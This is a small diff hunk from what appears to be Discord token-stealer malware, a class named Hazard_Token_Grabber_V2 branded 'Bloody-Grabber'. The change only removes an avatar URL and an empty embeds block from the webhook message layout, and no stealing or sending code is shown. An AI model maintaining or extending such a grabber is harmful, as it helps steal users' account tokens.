@@ -290,12 +290,6 @@ class Hazard_Token_Grabber_V2:
                     "thumbnail": {
                       "url": "https://i.pinimg.com/originals/e4/ee/3c/e4ee3c98ca208265da818f93a23814a9.gif"
                     },
-
-            "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
-            "embeds": [
-                {
-                    },
-
                     "footer": {
                       "text": "Thank You For Using Bloody-Grabber As Your Client"
                     }
